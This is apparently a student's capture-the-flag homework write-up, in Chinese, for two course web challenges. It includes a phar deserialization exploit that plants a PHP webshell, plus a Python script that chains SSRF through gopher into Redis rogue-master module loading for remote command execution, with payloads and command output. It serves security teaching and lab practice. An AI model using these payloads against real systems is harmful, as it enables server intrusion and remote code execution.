###### tags: `程式安全`
# Secure Programming HW6 Writeup
## Rero Meme
### 解法
題目在輸入username之後，可以上傳GIF的圖片
先找看看source code哪裡有洞
第一個找到的是session內容可控，可是找來找去只有一個寫死的include，沒有其他可以LFI的地方
```php=
$this->username = $_SESSION['username'] = $username;
```
接著找找看比較危險的函數，看到了file_get_contents跟file_put_contents
file_get_contents因為tmp_name是隨機的，不能控就放棄
然後file_put_contents的部份，filename在constructor的時候會被強行加上/images跟結尾的.gif，不過author跟title可控
```php=
//first
$content = file_get_contents($tmp_name);
//second
file_put_contents($this->filename, $this->content);
```
一開始是想寫個包含php內容的GIF，然後去修改.htaccess讓他被當作php跑，不過因為filename的關係會改不到，而且可能也有權限的問題
後來講師大大在聊天室提示是講了好幾頁的內容，經過刪去法後鎖定了反序列化
於是開始認真研究lib.php中含有file_put_contents的Meme class的內容

因為反序列化的關係，constructor是unserialize本身而不會去呼叫Meme的constructor
不過因為Meme沒寫wakeup function，unserialize的Meme object只會等被清掉時呼叫__destruct method
仔細一想這樣其實蠻不錯的，巧妙地繞過了filename的限制，又完成了file_put_contents的操作，可以上傳任意檔案與任意內容
```php=
class Meme
{
    public $title;
    public $author;
    public $filename;
    private $content = NULL;
    function __construct($title, $author, $content = NULL)
    {
        $this->title = $title;
        $this->author = $author;
        $this->content = $content;
        $this->filename = "images/$author/$title.gif";
    }
    function __destruct()
    {
        if ($this->content != NULL)
            file_put_contents($this->filename, $this->content);
    }
}
```
那接下來的問題變成了哪裡有反序列化漏洞，整段程式碼都沒有呼叫unserialize的方法
查詢講義之後發現可以靠phar的偽協議來強行觸發unserialize的呼叫，開始尋找可以塞phar的偽協議的function
file_get_contents的input不可控，而file_put_contents會被塞髒東西
看來看去突然注意到了is_dir這個function，查了一下後發現他的input是吃filename，而且如果裡面包含link的話會進行resolve，而且預設的input是username可控且沒多塞髒東西，可以完美塞入phar的偽協議
而phar的檔案可以事先開另外一個user上傳就好

都想好就開始攻擊，先寫好phar的檔案，phar的template參考了這個網站
http://www.lmxspace.com/2018/11/07/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Phar/
另外file的上傳會檢查最前面有沒有GIF的magic number，可以透過phar的stub在phar檔前面塞入GIF來通過檢查
我產phar檔的php如下，會先塞入halt_compiler的stub部份來讓文件被識別成phar檔，並在stub加入GIF header
之後寫好Meme class的內容，因為content是private的關係，不能直接用new的object去access，只好去修改constructor的部份讓filename是你想要的php檔名跟路徑
透過new來新增Meme object，把content設成可以透過參數a進行rce的system指令，再把object塞到metadata裡面，因為metadata的內容會被unserialize
```php=
<?php
	class Meme
	{
		public $title;
		public $author;
		public $filename;
		private $content = NULL;
		function __construct($title, $author, $content = NULL)
		{
			$this->title = $title;
			$this->author = $author;
			$this->content = $content;
			$this->filename = "images/john6090212/getshell.php";
		}
	}
	@unlink("phar.phar");
	$phar = new Phar("phar.phar"); 
    $phar->startBuffering();
	$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); 
	$o = new Meme("test",NULL,"<?php system(\$_GET[\"a\"]); ?>");
	$phar->setMetadata($o); 
	$phar->addFromString("test.txt", "test"); 
    $phar->stopBuffering();
?>
```
寫完以後把php.ini的phar.readonly改成Off來讓phar檔可以順利產生
產生完先登入john6090212這個user，把phar檔上傳上去，我title是寫123，所以檔案路徑會在/images/john6090212/123.gif

接著清掉session回到登入畫面，重新以phar://john6090212/123.gif的username登入，沒有images的原因是因為is_dir呼叫當下的directory是在images，登入後成功觸發反序列化上傳getshell.php檔案到images/john6090212/getshell.php

成功連到下面的檔案路徑確認檔案已被上傳http://rero.splitline.tw:8893/images/john6090212/getshell.php
透過get參數a執行rce，一樣根據splitline的習慣去根目錄找，成功看到flag
http://rero.splitline.tw:8893/images/john6090212/getshell.php?a=ls%20/
```
bin boot dev etc flag_b3I10KyNv9 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```
用cat指令得到flag內容 (flag好レロレロ= =)
```
FLAG{レロレロ?RERO!レロレロ,RERO?レロレロ~}
```
## 陸拾肆基底編碼之遠端圖像編碼器
### 解法
題目有個可以輸url的地方，先試著輸個簡單的ssrf payload
檢查壞掉的圖片內容，並做base64 decode，確認有ssrf漏洞
```
payload: file:///etc/passwd
```
隨便在題目網址後面加個/dog.php發現會噴apache的錯誤訊息，得知網站使用apache server，也就是網站檔案大概率放在/var/www/html
接著先到/var/www/html抓index.php的source code，以下是比較重要的部份，裡面include新的php file

```php=
<?php
    $page = str_replace("../", "", $_GET['page'] ?? 'home');
    include("page/$page.inc.php");
?>
```
去看預設的page/home.inc.php，發現是提交ssrf payload的那個表單，從action的部份可以知道page會設成result，也就是上面那段code會include result.inc.php
```php=
<form action="/?page=result" method="POST">
    <div class="field">
        <div class="control has-icons-left">
            <input class="input is-medium" type="text" name="url" value="https://truth.bahamut.com.tw/s01/202008/b7db086474644f19fa7377f30d99276f.JPG" placeholder="URL">
            <span class="icon is-small is-left">
                <i class="fa fa-link"></i>
            </span>
        </div>
    </div>

    <button class="button is-primary is-large is-fullwidth">
        <span class="icon">
            <i class="fas fa-exchange-alt"></i>
        </span>
        <span>轉換</span>
    </button>
</form>
```
檢查page/result.inc.php，看到蠻關鍵的部份
首先ip一定要輸四個part，而且開頭不能是192,172,10跟127，另外會透過curl拿到結果，沒問題的話會用base64加密結果並塞到img tag裡面
```php=
<?php
if ($url = @$_POST['url']) {
    if ($hostname = parse_url($url)['host']) {
        $ip = gethostbyname($hostname);
        $ip_part = explode(".", $ip);
        if (count($ip_part) !== 4 || in_array($ip_part[0], ['192', '172', '10', '127']))
            die("Invalid hostname.");
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $b64_img = base64_encode(curl_exec($ch));
    echo curl_error($ch) ? curl_error($ch) : "<img src=\"data:image/jpeg;base64,$b64_img\">";
    curl_close($ch);
}

?>
```
了解source code後，開始試比較常見的payload
試到/proc/net/tcp的時候發現了有趣的內容，有三個tcp port正處於listen 0.0.0.0:0的狀態，也就是很有可能可以攻擊，address decode成decimal如下:
```
0.0.0.0:80
127.0.0.11:39645
127.0.0.1:27134
```
0.0.0.0:80是web server用的，所以目標放在另外兩個
因為ip開頭不能是127，測的時候要改成hex的0x7f來bypass，而127.0.0.1可以改成0.0.0.0來bypass
127.0.0.11:39645測試過發現connection refused，只用127.0.0.11的話會噴400，加上apache server的錯，感覺不太對
最後一個127.0.0.1:27134，測了有噴錯，查了發現是redis server會噴的錯，而我在/etc/passwd也有看到redis的東西，感覺就是這個了
```
-ERR wrong number of arguments for 'get' command
```
開始思考redis要怎麼打，偷看了凱哥的cheat sheet發現可以透過寫webshell到web目錄的方式來達到RCE，結果發現dbfilename跟key都有改到，但是權限不夠，檔案寫不進/var/www/html資料夾裡，想想要是寫得進去index.php就可以被蓋掉了XD

接著試著查查看有沒有叫FLAG的key，發現沒有
而且key大家都可以改，萬一被改掉就看不到了，感覺不太合理

最後爬到了這個文章
https://github.com/vulhub/redis-rogue-getshell
看了一下裡面的指令就試著去看/tmp/exp.so有沒有存在，結果真的找到了XD
於是直接使用MODULE LOAD exp.so跟system.exec執行ls，執行成功，代表可以RCE了
後來server重開後這樣打會失效，需要重新設定一下，於是還是用了完整的攻擊指令，不過大部份指令其實都被過濾掉而失敗，應該是因為exp.so已經被講師放好跟LOAD好了，重點只是把dir改到tmp讓system.exec可以成功執行而已
那根據splitline lab放flag的經驗，先用ls /看一下根目錄，成功找到flag
```
$132
bin
boot
dev
etc
flag_LgqcHFhUFlwEmZ6jZ1zMzqfasc8SjaSw
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var

+OK
```
cat得到flag的內容，搞定
```
$34
FLAG{data:text/flag;r3d1s-s3rv3r}

+OK
```
最後附上我ssrf跟rce用的腳本，腳本的部份有參考下面網站的code，拿來生redis rce的payload
https://github.com/xmsec/redis-ssrf/blob/master/ssrf-redis.py
```python=
import requests
import base64

try:
    from urllib import quote
except:
    from urllib.parse import quote


def generate_rce(lhost, lport, command="cat /etc/passwd"):
    exp_filename = "exp.so"
    cmd = [
        "SLAVEOF {} {}".format(lhost, lport),
        "CONFIG SET dir /tmp/",
        "config set dbfilename {}".format(exp_filename),
        "MODULE LOAD /tmp/{}".format(exp_filename),
        "system.exec {}".format(command.replace(" ", "${IFS}")),
        "quit"
    ]
    return cmd


def redis_format(arr):
    CRLF = "\r\n"
    redis_arr = arr.split(" ")
    cmd = ""
    cmd += "*"+str(len(redis_arr))
    for x in redis_arr:
        cmd += CRLF+"$"+str(len((x)))+CRLF+x
    cmd += CRLF
    return cmd


def generate_payload(input_command):

    command = input_command
    lhost = "192.168.1.100"
    lport = "6666"
    cmd = generate_rce(lhost,lport,command)

    protocol = "gopher://"

    ip = "0.0.0.0"
    port = "27134"

    payload = protocol+ip+":"+port+"/_"

    for x in cmd:
        payload += quote(redis_format(x).replace("^", " "))
    return payload


if __name__ == "__main__":
    url = "http://base64image.splitline.tw:8894/?page=result"
    #ssrf_payload = "normal ssrf payload"
    #ssrf_payload = "gopher://0.0.0.0:27134/_%2A3%0D%0A%247%0D%0ASLAVEOF%0D%0A%2413%0D%0A192.168.1.100%0D%0A%244%0D%0A6666%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%245%0D%0A/tmp/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%246%0D%0Aexp.so%0D%0A%2A3%0D%0A%246%0D%0AMODULE%0D%0A%244%0D%0ALOAD%0D%0A%2411%0D%0A/tmp/exp.so%0D%0A%2A2%0D%0A%2411%0D%0Asystem.exec%0D%0A%242%0D%0Als%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A"
    cmd = "cat /flag_LgqcHFhUFlwEmZ6jZ1zMzqfasc8SjaSw"
    ssrf_payload = generate_payload(cmd)
    print(ssrf_payload)
    data = {"url": ssrf_payload}
    r = requests.post(url=url,data=data)
    s = r.text
    start = s.find('<img src="data:image/jpeg;base64,')+33
    if start != 32:
        end = s.find('"><hr>')
        base64_str = s[start:end]
        d = base64.b64decode(base64_str)
        print(d)
        print(d.decode('ascii'))
```
